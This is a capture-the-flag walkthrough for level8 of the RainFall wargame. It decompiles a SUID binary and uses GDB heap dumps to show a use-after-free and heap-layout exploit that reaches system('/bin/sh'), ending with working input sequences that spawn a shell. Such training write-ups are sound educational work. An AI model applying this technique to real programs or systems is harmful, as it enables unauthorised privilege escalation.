# Level8
Level8 let's us dive even deeper in heap overflows, by abusing a **use-after-free** vulnerability.

# Tools

# Walkthrough
The home of level8 contains a binary, `level8`.

We decompile it using dogbolt, and Hex-Rays:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
    char s[5]; // [esp+20h] [ebp-88h] BYREF
    char v5[2]; // [esp+25h] [ebp-83h] BYREF
    char v6[129]; // [esp+27h] [ebp-81h] BYREF

    while ( 1 )
    {
        printf("%p, %p \n", auth, (const void *)service);
        if ( !fgets(s, 128, stdin) )
            break;
        if ( !memcmp(s, "auth ", 5u) )
        {
            auth = (char *)malloc(4u);
            *(_DWORD *)auth = 0;
            if ( strlen(v5) <= 0x1E )
                strcpy(auth, v5);
        }
        if ( !memcmp(s, "reset", 5u) )
            free(auth);
        if ( !memcmp(s, "service", 6u) )
            service = (int)strdup(v6);
        if ( !memcmp(s, "login", 5u) )
        {
            if ( *((_DWORD *)auth + 8) )
                system("/bin/sh");
            else
                fwrite("Password:\n", 1u, 0xAu, stdout);
        }
    }
    return 0;
}
```
A `printf` writes the address of `auth` and `service`.
The `fgets` is secured, as it only accepts 128 bytes, so we can't overflow.

Actions performed when the "auth" keyword is entered:
1. A `malloc` is performed, allocating 4 bytes, address stored in `auth`. 
2. The content that was previously writen there is erased.
3. A length of a string is compared with 30. If it's smaller or equal, its content is writen to the space that just got allocated.

We notice a few other keywords:
- "reset": will call a free on the malloc'ed (`auth`) block.
- "service": strdup (basically malloc a block and copy the passed string into it) the content of a string, and stores the address in `service`.
- "login": if the content at `auth + 8` isn't null, call `system` with "/bin/sh". Else, writes "Password:\n" to the standard output.

Let's test this program:
```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth AAAA 
0x804a008, (nil) 
```
As we can see, now that we have given the keyword "auth", we made a malloc and the content of `auth` isn't `nil` anymore. 
Let's have a better look at the heap using GDB. Start the program, give it a "auth" and interrupt it.
```
level8@RainFall:~$ gdb -q level8
Reading symbols from /home/user/level8/level8...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/user/level8/level8 
(nil), (nil) 
auth admin
0x804a008, (nil) 
^C
Program received signal SIGINT, Interrupt.
0xb7fdd428 in __kernel_vsyscall ()
```

Now, let's get the address of the heap and have a look at its content:
```
(gdb) info proc mappings
process 11255
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level8/level8
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level8/level8
	 0x804a000  0x806b000    0x21000        0x0 [heap]
	0xb7e2b000 0xb7e2c000     0x1000        0x0 
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0 
	0xb7fd9000 0xb7fdd000     0x4000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) x/20wx 0x804a000
0x804a000:	0x00000000	0x00000011	0x696d6461	0x00000a6e
0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
```

The first line of the content of the heap is interesting.
`0x696d6461	0x00000a6e` is `imda` `00\nn`, which is what we have passed as a second argument when we used the "auth" keyword.
It's in reverse order because of the little-endianness of the system. 

Let's break before the `printf` (the first call line in the main), and ask GDB to print the content of the heap each time it reaches that breakpoint:
```
(gdb) disass main
...TRUNCATE...
   0x0804858e <+42>:	mov    DWORD PTR [esp],eax
   0x08048591 <+45>:	call   0x8048410 <printf@plt>
   0x08048596 <+50>:	mov    eax,ds:0x8049a80
...TRUNCATE...
(gdb) break *0x08048591
Breakpoint 1 at 0x8048591
(gdb) command 1
Type commands for breakpoint(s) 1, one per line.
End with a line saying just "end".
>echo ------------------------------------------------------\n
>x/20wx 0x804a000
>echo ------------------------------------------------------\n
>continue
>end
(gdb) r
Starting program: /home/user/level8/level8 

Breakpoint 1, 0x08048591 in main ()
------------------------------------------------------
0x804a000:	Cannot access memory at address 0x804a000
(gdb) c
Continuing.
(nil), (nil) 
auth admin

Breakpoint 1, 0x08048591 in main ()
------------------------------------------------------
0x804a000:	0x00000000	0x00000011	0x696d6461	0x00000a6e
0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
------------------------------------------------------
0x804a008, (nil) 
```
**It's normal that your GDB writes "0x804a000:	Cannot access memory at address 0x804a000" while you haven't used the "auth" keyword**


The struct `auth` contains space for a string of 32 characters. Thus, we need to overflow 32 bytes and then write something in order to pass the login test.

Look at the comments on the right side (start with "<---"):
```
(gdb) run                                                   <--- Start the program
Starting program: /home/user/level8/level8 

Breakpoint 1, 0x08048591 in main ()
------------------------------------------------------
0x804a000:	Cannot access memory at address 0x804a000
(gdb) c
Continuing.
(nil), (nil) 
auth admin                                                  <--- Auth as anyone

Breakpoint 1, 0x08048591 in main ()
------------------------------------------------------
0x804a000:	0x00000000	0x00000011	0x696d6461	0x00000a6e  <--- admin is written in the heap
0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
------------------------------------------------------
0x804a008, (nil) 
reset                                                       <--- we reset to call free on auth

Breakpoint 1, 0x08048591 in main ()
------------------------------------------------------
0x804a000:	0x00000000	0x00000011	0x00000000	0x00000a6e  <--- memory cleared (heap implementation)
0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
------------------------------------------------------
0x804a008, (nil) 
service AAA                                                 <--- We write 4 bytes (space taken)

Breakpoint 1, 0x08048591 in main ()
------------------------------------------------------
0x804a000:	0x00000000	0x00000011	0x41414120	0x0000000a
0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
------------------------------------------------------
0x804a008, 0x804a008 
service BBB                                                 <--- We write 4 bytes again, landing 16 bytes after `auth`

Breakpoint 1, 0x08048591 in main ()
------------------------------------------------------
0x804a000:	0x00000000	0x00000011	0x41414120	0x0000000a
0x804a010:	0x00000000	0x00000011	0x42424220	0x0000000a  <--- Again, lading 32 bytes after
0x804a020:	0x00000000	0x00020fe1	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
------------------------------------------------------
0x804a008, 0x804a018 
service CCC

Breakpoint 1, 0x08048591 in main ()
------------------------------------------------------
0x804a000:	0x00000000	0x00000011	0x41414120	0x0000000a
0x804a010:	0x00000000	0x00000011	0x42424220	0x0000000a
0x804a020:	0x00000000	0x00000011	0x43434320	0x0000000a  <--- We change the value of the int in the auth struct
0x804a030:	0x00000000	0x00020fd1	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
------------------------------------------------------
0x804a008, 0x804a028 
login                                                       <--- We can now login
$
```

Becaue GDB doesn't have the SUID bit, we can't get the flag, but by remaking every step command inputed in the same order to the `level8` binary, we can make the exploit work:
```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth admin
0x804a008, (nil) 
reset
0x804a008, (nil) 
service AAA
0x804a008, 0x804a008 
service BBB
0x804a008, 0x804a018 
service CCC
0x804a008, 0x804a028 
login
$
```
Or even:
```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth admin
0x804a008, (nil) 
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018 
login
$
```

# Resources
[LiveOverflow User-After-Free](https://www.youtube.com/watch?v=ZHghwsTRyzQ)